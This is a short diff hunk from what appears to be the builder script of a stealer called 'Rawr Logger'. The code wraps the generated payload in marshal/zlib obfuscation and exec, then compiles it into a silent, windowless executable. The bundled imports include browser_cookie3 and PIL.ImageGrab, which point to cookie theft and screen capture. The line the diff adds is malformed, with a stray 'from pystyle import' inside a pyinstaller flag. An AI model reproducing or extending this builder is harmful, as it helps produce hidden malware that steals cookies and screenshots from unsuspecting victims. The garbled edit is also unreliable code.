@@ -376,7 +376,7 @@ if prot == 'y':
         f.write(f"import marshal,zlib;exec(marshal.loads(zlib.decompress({zlb})))")
     compile = Write.Input("Would You Like To Complie To A Exe y/n:", Colors.green_to_yellow, interval=0.01)
     if compile == "y":
-      os.system(f'pyinstaller --onefile --noconsole --hidden-import="requests" --hidden-import="PIL" --hidden-import="os" --hidden-import="socket" --hidden-import="threading" --hidden-import="PIL.ImageGrab" --hidden-import="browser_cookie3" {name}.py')
+      os.system(f'pyinstaller --onefile --noconsole --hidden-import="requests" --hidden-import="PIL" --hidden-import="os" --hidden-import="socket" --hidden-import="threading" --hidden-import="PIL.ImageGrab"  --hidden-from pystyle import="*" --hidden-import="browser_cookie3" {name}.py')
       shutil.rmtree('build')
       os.remove(f'{name}.spec')
       Write.Print("Rawr Logger Was SucessFully Complied In Dist Folder\n",Colors.white_to_green, interval=0.01) 
